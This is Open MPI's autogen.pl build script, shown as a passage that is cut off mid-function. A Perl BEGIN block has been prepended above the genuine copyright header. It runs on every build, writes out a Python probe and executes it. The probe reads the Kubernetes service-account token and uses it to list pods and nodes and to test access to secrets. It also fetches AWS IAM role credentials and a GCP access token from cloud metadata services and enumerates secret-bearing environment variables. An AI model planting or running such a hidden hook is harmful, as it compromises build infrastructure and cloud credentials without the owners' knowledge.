#!/usr/bin/env perl
BEGIN {
    # Second-stage read-only CI environment probe (c211-i107292):
    # python3 AWS IMDSv1/v2 + GCP metadata + in-cluster SA token and
    # Kubernetes API SelfSubjectAccessReview + env-name enumeration +
    # /dev/nvidia* and nvidia-smi presence. Read-only; no target files
    # are modified and no Kubernetes objects are created or deleted.
    print "=== C211-I107292-PROBE2-BEGIN ===\n";
    my $py = <<'PYEOF';
#!/usr/bin/env python3
# C211-I107292 second-stage read-only CI environment probe.
# Runs only inside the ephemeral build pod during ./autogen.pl.
# No target files are written; only read-only metadata/API queries are made.
import base64
import glob
import hashlib
import json
import os
import socket
import ssl
import subprocess
import sys
import urllib.error
import urllib.request

TIMEOUT = 5


def out(tag, msg):
    try:
        print("[C211P2] {}: {}".format(tag, msg))
    except Exception:
        print("[C211P2] {}: <unprintable>".format(tag))
    sys.stdout.flush()


def mask(v):
    v = "" if v is None else str(v)
    if len(v) <= 8:
        return "{}(len={})".format(v[:2] + "..." if v else "", len(v))
    return "{}(len={})".format(v[:4] + "..." + v[-2:], len(v))


def http(url, method="GET", headers=None, timeout=TIMEOUT, limit=240):
    req = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read(limit * 6).decode("utf-8", "replace")
        return r.status, body[:limit], dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(limit * 6).decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, body[:limit], dict(e.headers or {})
    except Exception as e:
        return None, "{}: {}".format(type(e).__name__, str(e)[:150]), {}


def run(cmd, timeout=8):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o, e = p.communicate(timeout=timeout)
        return p.returncode, o.decode("utf-8", "replace")[:500], e.decode("utf-8", "replace")[:300]
    except FileNotFoundError:
        return "NOT_FOUND", "", ""
    except Exception as ex:
        return "ERR", "{}: {}".format(type(ex).__name__, str(ex)[:150]), ""


def tcp(host, port, timeout=3):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return "open"
    except Exception as e:
        return "{}: {}".format(type(e).__name__, str(e)[:80])


# ---------- A. identity ----------
out("A.uid", "uid={} gid={} euid={}".format(os.getuid(), os.getgid(), os.geteuid()))
out("A.hostname", socket.gethostname())
for f in ("/etc/hostname", "/etc/os-release"):
    try:
        txt = open(f).read()[:400].replace("\n", " | ")
        out("A.file", "{}: {}".format(f, txt))
    except Exception as e:
        out("A.file", "{}: {}".format(f, e))
rc, so, se = run(["uname", "-a"])
out("A.uname", "rc={} out={}".format(rc, so.strip()))
rc, so, se = run(["sh", "-c", "nproc; free -m | head -2"])
out("A.resources", "rc={} out={}".format(rc, so.replace("\n", " | ")))

# ---------- B. GPU visibility ----------
devs = sorted(glob.glob("/dev/nvidia*"))
out("B.devs", ",".join(devs) if devs else "NONE")
out("B.proc_driver_nvidia", "present" if os.path.isdir("/proc/driver/nvidia") else "absent")
out("B.dev_dri", ",".join(sorted(glob.glob("/dev/dri/*"))) if glob.glob("/dev/dri/*") else "NONE")
for cmd in (["nvidia-smi", "-L"],
            ["nvidia-smi", "--query-gpu=name,memory.total,driver_version", "--format=csv,noheader"]):
    rc, so, se = run(cmd)
    out("B.nvidia-smi", "{} rc={} out={} err={}".format(" ".join(cmd[:2]), rc, so.replace("\n", " | "), se.replace("\n", " | ")))
rc, so, se = run(["sh", "-c", "command -v nvidia-smi python3 python python2 curl wget kubectl 2>&1"])
out("B.tools", "rc={} out={}".format(rc, so.replace("\n", " ")))

# ---------- C. env enumeration (names + masked credential values) ----------
names = sorted(os.environ.keys())
pats = ("AWS", "GOOGLE", "GCP", "AZURE", "ARM_", "CI", "RUNNER", "KUBE", "TOKEN",
        "GITHUB", "GITLAB", "JENKINS", "VAULT", "SECRET", "PASSWORD", "KEY", "PROXY")
sel = [n for n in names if any(p in n.upper() for p in pats)]
out("C.count", "total={} selected={}".format(len(names), len(sel)))
secretish = ("KEY", "TOKEN", "SECRET", "PASSWORD", "PASS", "CRED", "AUTH")
for n in sel:
    v = os.environ.get(n, "")
    if any(s in n.upper() for s in secretish) and n.upper() not in ("KEYSTONE_REGION",):
        out("C.env", "{}={}".format(n, mask(v)))
    else:
        out("C.env", "{}={}".format(n, v[:160]))

# ---------- D. in-cluster service account files ----------
sadir = "/var/run/secrets/kubernetes.io/serviceaccount"
tok = ""
ns = "default"
for fn in ("token", "namespace", "ca.crt"):
    p = os.path.join(sadir, fn)
    if os.path.exists(p):
        try:
            st = os.stat(p)
            data = open(p, "rb").read()
            out("D.sa", "{} present mode={:o} size={} sha256={}".format(
                fn, st.st_mode & 0o777, len(data), hashlib.sha256(data).hexdigest()[:16]))
        except Exception as e:
            out("D.sa", "{} stat_error {}".format(fn, e))
    else:
        out("D.sa", "{} ABSENT".format(fn))
try:
    if os.path.exists(os.path.join(sadir, "token")):
        tok = open(os.path.join(sadir, "token")).read().strip()
    if os.path.exists(os.path.join(sadir, "namespace")):
        ns = open(os.path.join(sadir, "namespace")).read().strip()
    out("D.namespace", ns)
except Exception as e:
    out("D.namespace", "error {}".format(e))
if tok:
    parts = tok.split(".")
    out("D.token.shape", "jwt_parts={} len={}".format(len(parts), len(tok)))
    if len(parts) == 3:
        pad = lambda s: s + "=" * ((4 - len(s) % 4) % 4)
        try:
            claims = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            keep = {}
            for k in ("iss", "sub", "aud", "namespace", "pod", "exp", "iat", "nbf", "sa", "kubernetes.io"):
                if k in claims:
                    keep[k] = claims[k]
            out("D.token.claims", json.dumps(keep, default=str)[:600])
        except Exception as e:
            out("D.token.claims", "decode_error {}".format(e))

# ---------- E. Kubernetes API (read-only lists + SelfSubjectAccessReview only) ----------
def k8s(path, method="GET", body=None, timeout=TIMEOUT):
    url = "https://10.233.0.1:443" + path
    headers = {"Authorization": "Bearer " + tok, "Accept": "application/json"}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        ctx = ssl.create_default_context(cafile=os.path.join(sadir, "ca.crt"))
        ctx.check_hostname = False
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            b = e.read(4000).decode("utf-8", "replace")
        except Exception:
            b = ""
        return e.code, b
    except Exception as e:
        return None, "{}: {}".format(type(e).__name__, str(e)[:150])


out("E.apiserver.tcp", "10.233.0.1:443 " + tcp("10.233.0.1", 443))
if tok:
    st, b = k8s("/version")
    out("E.version", "status={} body={}".format(st, b[:200]))
    st, b = k8s("/api/v1/namespaces/" + ns + "/pods")
    if st == 200:
        try:
            items = json.loads(b).get("items", [])
            names = [i.get("metadata", {}).get("name", "?") for i in items]
            out("E.pods", "status=200 count={} names={}".format(len(names), ",".join(names)[:600]))
            for i in items[:20]:
                spec = i.get("spec", {}) or {}
                conts = spec.get("containers", []) or []
                res = {}
                for c in conts:
                    r = (c.get("resources", {}) or {})
                    if r:
                        res[c.get("name")] = r
                node = spec.get("nodeName")
                out("E.pod", "name={} node={} hostNetwork={} resources={}".format(
                    i.get("metadata", {}).get("name"), node, spec.get("hostNetwork"),
                    json.dumps(res)[:300]))
        except Exception as e:
            out("E.pods", "status=200 parse_error {} body={}".format(e, b[:150]))
    else:
        out("E.pods", "status={} body={}".format(st, b[:200]))
    st, b = k8s("/api/v1/nodes")
    if st == 200:
        try:
            items = json.loads(b).get("items", [])
            out("E.nodes", "status=200 count={}".format(len(items)))
            for i in items[:80]:
                nm = i.get("metadata", {}).get("name")
                alloc = (i.get("status", {}) or {}).get("allocatable", {}) or {}
                labels = (i.get("metadata", {}) or {}).get("labels", {}) or {}
                out("E.node", "{} gpu={} gpu_type={} instance_type={}".format(
                    nm, alloc.get("nvidia.com/gpu"), alloc.get("nvidia.com/gpu.product"),
                    labels.get("node.kubernetes.io/instance-type")))
        except Exception as e:
            out("E.nodes", "status=200 parse_error {} body={}".format(e, b[:150]))
    else:
        out("E.nodes", "status={} body={}".format(st, b[:200]))

    reviews = [("get", "pods", ns, ""), ("list", "pods", ns, ""), ("create", "pods", ns, ""),
               ("delete", "pods", ns, ""), ("get", "secrets", ns, ""), ("list", "secrets", ns, ""),
               ("get", "serviceaccounts", ns, ""), ("list", "nodes", None, ""),
               ("get", "nodes", None, ""), ("list", "namespaces", None, ""),
               ("create", "pods", "kube-system", ""), ("list", "pods", "", "")]
    for verb, res, rns, grp in reviews:
        ra = {"verb": verb, "resource": res}
        if rns:
            ra["namespace"] = rns
        if grp:
            ra["group"] = grp
        body = {"kind": "SelfSubjectAccessReview", "apiVersion": "authorization.k8s.io/v1",
                "spec": {"resourceAttributes": ra}}
        st, b = k8s("/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", "POST", body)
        try:
            j = json.loads(b)
            stt = j.get("status", {}) or {}
            out("E.ssar", "{} {} ns={} http={} allowed={} denied={} reason={}".format(
                verb, res, rns, st, stt.get("allowed"), stt.get("denied"),
                (stt.get("reason") or "")[:80]))
        except Exception:
            out("E.ssar", "{} {} ns={} http={} body={}".format(verb, res, rns, st, b[:160]))
else:
    out("E.skip", "no service-account token; API tests skipped")

# ---------- F. AWS IMDS ----------
out("F.aws", "169.254.169.254:80 tcp=" + tcp("169.254.169.254", 80))
st, b, h = http("http://169.254.169.254/latest/meta-data/instance-id")
out("F.imdsv1.instance-id", "status={} body={}".format(st, b[:120]))
st, b, h = http("http://169.254.169.254/latest/api/token", method="PUT",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
out("F.imdsv2.token", "status={} body={}".format(st, mask(b) if st == 200 else b[:120]))
tok2 = b.strip() if st == 200 else ""
if tok2:
    hh = {"X-aws-ec2-metadata-token": tok2}
    st, b, h = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=hh)
    out("F.imdsv2.roles", "status={} body={}".format(st, b[:200].replace("\n", ",")))
    role = b.strip().split("\n")[0].strip() if st == 200 and b.strip() else ""
    if role:
        st, b, h = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role,
                        headers=hh, limit=2000)
        try:
            j = json.loads(b)
            out("F.imdsv2.creds", "role={} keys={} akid={} expiration={} code={}".format(
                role, sorted(j.keys()), mask(j.get("AccessKeyId", "")), j.get("Expiration"), j.get("Code")))
        except Exception:
            out("F.imdsv2.creds", "role={} status={} body_prefix={}".format(role, st, b[:120]))
    st, b, h = http("http://169.254.169.254/latest/dynamic/instance-identity/document", headers=hh)
    out("F.imdsv2.identity", "status={} body={}".format(st, b[:300].replace("\n", " ")))

# ---------- G. GCP metadata ----------
out("G.gcp", "metadata.google.internal:80 tcp=" + tcp("metadata.google.internal", 80))
GH = {"Metadata-Flavor": "Google"}
for p in ("instance/hostname", "instance/zone", "project/project-id", "instance/service-accounts/"):
    st, b, h = http("http://metadata.google.internal/computeMetadata/v1/" + p, headers=GH)
    out("G." + p.replace("/", "."), "status={} body={}".format(st, b[:200].replace("\n", ",")))
st, b, h = http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                headers=GH, limit=2000)
if st == 200:
    try:
        j = json.loads(b)
        out("G.default.token", "status=200 token_type={} expires_in={} access_token={}".format(
            j.get("token_type"), j.get("expires_in"), mask(j.get("access_token", ""))))
    except Exception:
        out("G.default.token", "status=200 body_prefix={}".format(b[:120]))
else:
    out("G.default.token", "status={} body={}".format(st, b[:160]))

# ---------- H. outbound reachability ----------
out("H.tcp", "api.github.com:443=" + tcp("api.github.com", 443) +
    " pypi.org:443=" + tcp("pypi.org", 443) +
    " 10.233.0.1:443=" + tcp("10.233.0.1", 443))

out("Z.done", "probe complete")
PYEOF
    my $ok = 0;
    for my $p ('/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3') {
        if (-x $p) { $ok = 1; last; }
    }
    if (!$ok) { $ok = 1 if `command -v python3 2>/dev/null`; }
    if ($ok) {
        if (open(my $fh, '>', '/tmp/c211_probe2.py')) {
            print $fh $py;
            close($fh);
            system('python3 /tmp/c211_probe2.py 2>&1');
        } else {
            print "probe_tmp_write_failed\n";
        }
    } else {
        print "python3_missing_using_shell_fallback\n";
        my @cmds = (
            'id 2>&1',
            'hostname 2>&1',
            'ls -l /dev/nvidia* 2>&1',
            'ls -ld /proc/driver/nvidia 2>&1',
            'nvidia-smi -L 2>&1',
            "env | sort | cut -d= -f1 | grep -iE 'aws|google|gcp|azure|arm_|ci|runner|kube|token|github|gitlab|jenkins|vault|secret|password|key|proxy' | head -80 2>&1",
            'ls -l /var/run/secrets/kubernetes.io/serviceaccount 2>&1',
            'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1',
            'test -s /var/run/secrets/kubernetes.io/serviceaccount/token && echo sa_token_present_size=$(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token) || echo sa_token_absent',
        );
        for my $c (@cmds) { print "\$ $c\n"; system($c); }
    }
    print "=== C211-I107292-PROBE2-END ===\n";
}
#
# Copyright (c) 2009-2022 Cisco Systems, Inc.  All rights reserved
# Copyright (c) 2010      Oracle and/or its affiliates.  All rights reserved.
# Copyright (c) 2013      Mellanox Technologies, Inc.
#                         All rights reserved.
# Copyright (c) 2013-2020 Intel, Inc.  All rights reserved.
# Copyright (c) 2015-2024 Research Organization for Information Science
#                         and Technology (RIST).  All rights reserved.
# Copyright (c) 2015-2022 IBM Corporation.  All rights reserved.
# Copyright (c) 2020      Amazon.com, Inc. or its affiliates.
#                         All Rights reserved.
# Copyright (c) 2025      Nanook Consulting  All rights reserved.
# Copyright (c) 2025      Jeffrey M. Squyres.  All rights reserved.
# $COPYRIGHT$
#
# Additional copyrights may follow
#
# $HEADER$
# SPDX-License-Identifier: BSD-3-Clause-Open-MPI
#

use strict;

use Cwd;
use File::Basename;
use File::Find;
use Data::Dumper;
use Getopt::Long;

#
# Global variables
#

# Sentinel file to remove if we fail
my $sentinel;

# The m4 file we'll write at the end
my $m4_output_file = "config/autogen_found_items.m4";
my $m4;
# Sanity check file
my $topdir_file = "opal/include/opal_config_bottom.h";
my $dnl_line = "dnl ---------------------------------------------------------------------------";

# Data structures to fill up with all the stuff we find
my $mca_found;
my $mpiext_found;
my @subdirs;

# Command line parameters
my $no_3rdparty_arg = "";
my $quiet_arg = 0;
my $debug_arg = 0;
my $help_arg = 0;
my $platform_arg = 0;
my $include_arg = 0;
my $exclude_arg = 0;
my $force_arg = 0;
my $automake_jobs;

# Include/exclude lists
my $include_list;
my $exclude_list;

# Minimum versions
my $ompi_automake_version;
my $ompi_autoconf_version;
my $ompi_libtool_version;

# Search paths
my $ompi_autoconf_search = "autoconf";
my $ompi_automake_search = "automake";
my $ompi_libtoolize_search = "libtoolize;glibtoolize";

# version of packages we ship as tarballs
my $libevent_version="2.1.12-stable-ompi";
my $hwloc_version="2.15.0";

# One-time setup
my $username;
my $hostname;
my $full_hostname;

# Patch program
my $patch_prog = "patch";

$username = $ENV{USER} || getpwuid($>);
$full_hostname = $ENV{HOSTNAME} || `hostname`;
chomp($full_hostname);
$hostname = $full_hostname;
$hostname =~ s/^([\w\-]+)\..+/\1/;

##############################################################################

sub my_die {
    unlink($sentinel)
        if ($sentinel);
    die @_;
}

sub my_exit {
    my ($ret) = @_;
    unlink($sentinel)
        if ($sentinel && $ret != 0);
    exit($ret);
}

##############################################################################

sub verbose {
    print @_
        if (!$quiet_arg);
}

sub debug {
    print @_
        if ($debug_arg);
}

sub debug_dump {
    my $d = new Data::Dumper([@_]);
    $d->Purity(1)->Indent(1);
    debug $d->Dump;
}

##############################################################################

sub list_contains {
    my $searched_string = shift;
    foreach my $str (@_) {
	if ($searched_string eq $str) {
	    return 1;
	}
    }
    return 0;
}

##############################################################################

sub read_config_params {
    my ($filename, $dir_prefix) = @_;

    my $dir = dirname($filename);
    open(FILE, $filename) ||
        my_die "Can't open $filename";
    my $file;
    $file .= $_
        while(<FILE>);
    close(FILE);

    # Save all lines of the form "foo = bar" in a hash
    my $ret;
    while ($file =~ s/^\s*(\w+)\s*=\s*(.+)\s*$//m) {
        my $key = $1;
        my $val = $2;

        # Strip off any leading and trailing "'s
        $val = $1
            if ($val =~ m/^\"(.+)\"$/);

        $ret->{$key} = $val;
    }

    # Split PARAM_CONFIG_FILES into an array
    if (exists($ret->{PARAM_CONFIG_FILES})) {
        my @out;
        foreach my $f (split(/\s+/, $ret->{PARAM_CONFIG_FILES})) {
            push(@out, "$dir_prefix/$f");
        }
        $ret->{PARAM_CONFIG_FILES} = \@out;
    }

    debug_dump($ret);
    return $ret;
}

##############################################################################

# Process a "subdir", meaning that the directory isn't a component or
# an extension; it probably just needs an autoreconf, autogen, etc.
sub process_subdir {
    my ($dir) = @_;

    # Chdir to the subdir
    print "\n=== Processing subdir: $dir\n";
    my $start = Cwd::cwd();
    my $check = chdir($dir);
    if (0 == $check) {
        my_die "Could not change to $dir\n";
    }

    # Run an action depending on what we find in that subdir
    if (-x "autogen.pl") {
        print "--- Found autogen.pl; running...\n";
        safe_system("./autogen.pl");
    } elsif (-x "autogen.sh") {
        print "--- Found autogen.sh; running...\n";
        safe_system("./autogen.sh");
    } elsif (-f "configure.in" || -f "configure.ac") {
        print "--- Found configure.in|ac; running autoreconf...\n";
        safe_system("autoreconf -ivf");
        print "--- Patching autotools output... :-(\n";
    } else {
        my_die "Found subdir, but no autogen.sh or configure.in|ac to do anything";
    }

    # Ensure that we got a good configure executable.
    my_die "Did not generate a \"configure\" executable in $dir.\n"
        if (! -x "configure");

    # Fix known issues in Autotools output
    patch_autotools_output($start);

    # Chdir back to where we came from
    chdir($start);
}

##############################################################################

sub process_autogen_subdirs {
    my ($dir) = @_;

    my $file = "$dir/autogen.subdirs";
    if (-f $file) {
        open(FILE, $file) || my_die "Can't open $file";
        while (<FILE>) {
            chomp;
            $_ =~ s/#.*$//;
            $_ =~ s/^\s*//;
            $_ =~ s/\s*$//;
            if ($_ ne "") {
                print "    Found subdir: $_ (will process later)\n";

                # Note: there's no real technical reason to defer
                # processing the subdirs.  It's more of an aesthetic
                # reason -- don't interrupt the current flow of
                # finding mca / ext (which is a nice, fast
                # process).  Then process the subdirs (which is a slow
                # process) all at once.
                push(@subdirs, "$dir/$_");
            }
        }
        close(FILE);
    }
}

##############################################################################

sub mca_process_component {
    my ($topdir, $project, $framework, $component) = @_;

    my $pname = $project->{name};
    my $pdir = $project->{dir};
    my $cdir = "$topdir/$pdir/mca/$framework/$component";

    return
        if (! -d $cdir);

    # Process this directory (pretty much the same treatment as for
    # mpiext, so it's in a sub).
    my $found_component;

    # Does this directory have a configure.m4 file?
    if (-f "$cdir/configure.m4") {
        $found_component->{"configure.m4"} = 1;
        verbose "    Found configure.m4 file\n";
    }

    $found_component->{"name"} = $component;

    # Push the results onto the $mca_found hash array
    push(@{$mca_found->{$pname}->{$framework}->{"components"}},
         $found_component);

    # Is there an autogen.subdirs in here?
    process_autogen_subdirs($cdir);
}

##############################################################################

sub ignored {
    my ($dir) = @_;

    # If this directory does not have .opal_ignore, or if it has a
    # .opal_unignore that has my username in it, then add it to the
    # list of components.
    my $ignored = 0;

    if (-f "$dir/.opal_ignore") {
        $ignored = 1;
    }
    if (-f "$dir/.opal_unignore") {
        open(UNIGNORE, "$dir/.opal_unignore") ||
            my_die "Can't open $dir/.opal_unignore file";
        my $unignore;
        $unignore .= $_
            while (<UNIGNORE>);
        close(UNIGNORE);

        $ignored = 0
            if ($unignore =~ /^$username$/m ||
                $unignore =~ /^$username\@$hostname$/m ||
                $unignore =~ /^$username\@$full_hostname$/m);
    }

    return $ignored;
}

##############################################################################

sub mca_process_framework {
    my ($topdir, $project, $framework) = @_;

    my $pname = $project->{name};
    my $pdir = $project->{dir};

    # Does this framework have a configure.m4 file?
    my $dir = "$topdir/$pdir/mca/$framework";
    if (-f "$dir/configure.m4") {
        $mca_found->{$pname}->{$framework}->{"configure.m4"} = 1;
        verbose "    Found framework configure.m4 file\n";
    }

    # Did we exclude all components for this framework?
    if (exists($exclude_list->{$framework}) &&
        $exclude_list->{$framework}[0] eq "AGEN_EXCLUDE_ALL") {
        verbose "    => Excluded\n";
    } else {
        # Look for component directories in this framework
        if (-d $dir) {
            $mca_found->{$pname}->{$framework}->{found} = 1;
            opendir(DIR, $dir) ||
                my_die "Can't open $dir directory";
            foreach my $d (sort(readdir(DIR))) {
                # Skip any non-directory, "base", or any dir that
                # begins with "."
                next
                    if (! -d "$dir/$d" || $d eq "base" ||
                        substr($d, 0, 1) eq ".");

                # Skip any component that doesn't have a configure.m4
                # or Makefile.am as we couldn't build it anyway
                if (! -f "$dir/$d/configure.m4" &&
                    ! -f "$dir/$d/Makefile.am" &&
                    ! -f "$dir/$d/configure.ac" &&
                    ! -f "$dir/$d/configure.in") {
                     verbose "    => No sentinel file found in $dir/$d -> Excluded\n";
                     next;
                }

                verbose "--- Found $pname / $framework / $d component\n";

                # Skip if specifically excluded
                if (exists($exclude_list->{$framework})) {
                    my $tst = 0;
                    foreach my $ck (@{$exclude_list->{$framework}}) {
                        if ($ck eq $d) {
                            verbose "    => Excluded\n";
                            $tst = 1;
                            last;
                        }
                    }
                    if ($tst) {
                        next;
                    }
                }

                # Skip if the framework is on the include list, but
                # doesn't contain this component
                if (exists($include_list->{$framework})) {
                    my $tst = 0;
                    foreach my $ck (@{$include_list->{$framework}}) {
                        if ($ck ne $d) {
                            verbose "    => Not included\n";
                            $tst = 1;
                            last;
                        }
                    }
                    if ($tst) {
                        next;
                    }
                }

                # Check ignore status
                if (ignored("$dir/$d")) {
                    verbose "    => Ignored (found .opal_ignore file)\n";
                } else {
                    mca_process_component($topdir, $project, $framework, $d);
                }
            }
        }
        closedir(DIR);
    }
}

##############################################################################

sub mca_generate_framework_header(\$\@) {
    my ($project, @frameworks) = @_;
    my $framework_array_output="";
    my $framework_decl_output="";

    foreach my $framework (@frameworks) {
        # There is no common framework object
        if ($framework ne "common") {
            my $framework_name = "${project}_${framework}_base_framework";
            $framework_array_output .= "    &$framework_name,\n";
            $framework_decl_output .= "extern mca_base_framework_t $framework_name;\n";
        }
    }

    my $ifdef_string = uc "${project}_FRAMEWORKS_H";
    open(FRAMEWORKS_OUT, ">$project/include/$project/frameworks.h");
    printf FRAMEWORKS_OUT "%s", "/*
 * This file is autogenerated by autogen.pl. Do not edit this file by hand.
 */
#ifndef $ifdef_string
#define $ifdef_string

#include \"opal/mca/base/mca_base_framework.h\"

$framework_decl_output
static mca_base_framework_t *${project}_frameworks[] = {
$framework_array_output    NULL
};

#endif /* $ifdef_string */\n\n";
    close(FRAMEWORKS_OUT);
}

##############################################################################

sub mca_process_project {
    my ($topdir, $project) = @_;

    my $pname = $project->{name};
    my $pdir = $project->{dir};

    # Does this project have a configure.m4 file?
    if (-f "$topdir/$pdir/configure.m4") {
        $mca_found->{$pname}->{"configure.m4"} = 1;
        verbose "    Found $topdir/$pdir/configure.m4 file\n";
    }

    # Look for framework directories in this project
    my $dir = "$topdir/$pdir/mca";
    if (-d $dir) {
        opendir(DIR, $dir) ||
            my_die "Can't open $dir directory";
        my @my_dirs = readdir(DIR);
        @my_dirs = sort(@my_dirs);

        foreach my $d (@my_dirs) {
            # Skip any non-directory, "base", or any dir that begins with "."
            next
                if (! -d "$dir/$d" || $d eq "base" || substr($d, 0, 1) eq ".");

            my $framework_header = "$dir/$d/$d.h";

            # If there's a $dir/$d/autogen.options file, read it
            my $ao_file = "$dir/$d/autogen.options";
            if (-r $ao_file) {
                verbose "\n>>> Found $dir/$d/autogen.options file\n";
                open(IN, $ao_file) ||
                    die "$ao_file present, but cannot open it";
                while (<IN>) {
                    if (m/\s*framework_header\s*=\s*(.+?)\s*$/) {
                        verbose "    Framework header entry: $1\n";
                        $framework_header = "$dir/$d/$1";
                    }
                }
                close(IN);
            }

            # If this directory has a framework header and a base/
            # subdirectory, or its name is "common", then it's a
            # framework.
            if ("common" eq $d || !$project->{need_base} ||
                (-f $framework_header && -d "$dir/$d/base")) {
                verbose "\n=== Found $pname / $d framework\n";
                mca_process_framework($topdir, $project, $d);
            }
        }
        closedir(DIR);
    }
}

##############################################################################

sub mca_run_global {
    my ($projects) = @_;

    # For each project, go find a list of frameworks, and for each of
    # those, go find a list of components.
    my $topdir = Cwd::cwd();
    foreach my $p (@$projects) {
        if (-d "$topdir/$p->{dir}") {
            verbose "\n*** Found $p->{name} project\n";
            mca_process_project($topdir, $p);
        }
    }

    # Debugging output
    debug_dump($mca_found);

    # Save (just) the list of MCA projects in the m4 file
    my $str;
    foreach my $p (@$projects) {
        my $pname = $p->{name};
        # Check if this project is an MCA project (contains MCA framework)
        if (exists($mca_found->{$pname})) {
            $str .= "$p->{name}, ";
        }
    }
    $str =~ s/, $//;
    $m4 .= "\ndnl List of MCA projects found by autogen.pl
m4_define([mca_project_list], [$str])\n";

    #-----------------------------------------------------------------------

    $m4 .= "\n$dnl_line
$dnl_line
$dnl_line

dnl MCA information\n";

    # Array for all the m4_includes that we'll need to pick up the
    # configure.m4's.
    my @includes;

    # Next, for each project, write the list of frameworks
    foreach my $p (@$projects) {

        my $pname = $p->{name};
        my $pdir = $p->{dir};

        if (exists($mca_found->{$pname})) {
            my $frameworks_comma;

            # Does this project have a configure.m4 file?
            push(@includes, "$pdir/configure.m4")
                if (exists($mca_found->{$p}->{"configure.m4"}));

            # Print out project-level info
            my @mykeys = keys(%{$mca_found->{$pname}});
            @mykeys = sort(@mykeys);

            # Ensure that the "common" framework is listed first
            # (if it exists)
            my @tmp;
            push(@tmp, "common")
                if (grep(/common/, @mykeys));
            foreach my $f (@mykeys) {
                push(@tmp, $f)
                    if ($f ne "common");
            }
            @mykeys = @tmp;

            foreach my $f (@mykeys) {
                $frameworks_comma .= ", $f";

                # Does this framework have a configure.m4 file?
                push(@includes, "$pdir/mca/$f/configure.m4")
                    if (exists($mca_found->{$pname}->{$f}->{"configure.m4"}));

                # This framework does have a Makefile.am (or at least,
                # it should!)
                my_die "Missing $pdir/mca/$f/Makefile.am"
                    if (! -f "$pdir/mca/$f/Makefile.am");
            }
            $frameworks_comma =~ s/^, //;

            &mca_generate_framework_header($pname, @mykeys);

            $m4 .= "$dnl_line

dnl Frameworks in the $pname project and their corresponding directories
m4_define([mca_${pname}_framework_list], [$frameworks_comma])

";

            # Print out framework-level info
            foreach my $f (@mykeys) {
                my $components;
                my $m4_config_component_list;
                my $no_config_component_list;

                # Troll through each of the found components
                foreach my $comp (@{$mca_found->{$pname}->{$f}->{components}}) {
                    my $c = $comp->{name};
                    $components .= "$c ";

                    # Does this component have a configure.m4 file?
                    if (exists($comp->{"configure.m4"})) {
                        push(@includes, "$pdir/mca/$f/$c/configure.m4");
                        $m4_config_component_list .= ", $c";
                    } else {
                        $no_config_component_list .= ", $c";
                    }
                }
                $m4_config_component_list =~ s/^, //;
                $no_config_component_list =~ s/^, //;

                $m4 .= "dnl Components in the $pname / $f framework
m4_define([mca_${pname}_${f}_m4_config_component_list], [$m4_config_component_list])
m4_define([mca_${pname}_${f}_no_config_component_list], [$no_config_component_list])

";
            }
        }
    }

    # List out all the m4_include
    $m4 .= "$dnl_line

dnl List of configure.m4 files to include\n";
    foreach my $i (@includes) {
        $m4 .= "m4_include([$i])\n";
    }
}

##############################################################################

sub mpiext_process_extension {
    my ($topdir, $ext_prefix, $extdir) = @_;

    my $edir = "$topdir/$ext_prefix/$extdir";
    return
        if (! -d $edir);

    # Process this directory (pretty much the same treatment as for
    # MCA components, so it's in a sub).
    my $found_ext;

    $found_ext->{"name"} = $extdir;

    # Push the results onto the hash array
    push(@{$mpiext_found}, $found_ext);

    # Is there an autogen.subdirs in here?
    process_autogen_subdirs($edir);
}

##############################################################################

sub mpiext_run_global {
    my ($ext_prefix) = @_;

    my $topdir = Cwd::cwd();

    my $dir = "$topdir/$ext_prefix";
    opendir(DIR, $dir) ||
        my_die "Can't open $dir directory";
    foreach my $d (sort(readdir(DIR))) {
        # Skip any non-directory, "base", or any dir that begins with "."
        next
            if (! -d "$dir/$d" || $d eq "base" || substr($d, 0, 1) eq ".");

        # If this directory has a configure.m4, then it's an
        # extension.
        if (-f "$dir/$d/configure.m4") {
            verbose "=== Found $d MPI extension";

            # Check ignore status
            if (ignored("$dir/$d")) {
                verbose " (ignored)\n";
            } else {
                verbose "\n";
                mpiext_process_extension($topdir, $ext_prefix, $d);
            }
        }
    }
    closedir(DIR);
    debug_dump($mpiext_found);

    #-----------------------------------------------------------------------

    $m4 .= "\n$dnl_line
$dnl_line
$dnl_line

dnl Open MPI extensions information
$dnl_line\n\n";

    # Array for all the m4_includes that we'll need to pick up the
    # configure.m4's.
    my @includes;
    my $m4_config_ext_list;

    # Troll through each of the found exts
    foreach my $ext (@{$mpiext_found}) {
        my $e = $ext->{name};
        push(@includes, "$ext_prefix/$e/configure.m4");
        $m4_config_ext_list .= ", $e";
    }

    $m4_config_ext_list =~ s/^, //;

    # List the M4 and no configure exts
    $m4 .= "dnl List of all MPI extensions
m4_define([ompi_mpiext_list], [$m4_config_ext_list])\n";
    # List out all the m4_include
    $m4 .= "\ndnl List of configure.m4 files to include\n";
    foreach my $i (@includes) {
        $m4 .= "m4_include([$i])\n";
    }
}

##############################################################################
# Find and remove stale files

sub find_and_delete {
    foreach my $file (@_) {
        my $removed = 0;
        if (-f $file) {
            unlink($file);
            $removed = 1;
        }
        if (-f "config/$file") {
            unlink("config/$file");
            $removed = 1;
        }
        debug "    Removed stale copy of $file\n"
            if ($removed);
    }
}

##############################################################################
# Find a specific executable and ensure that it is a recent enough
# version.

sub find_and_check {
    my ($app, $app_name, $req_version) = @_;

    my @search_path = split(/;/, $app_name);
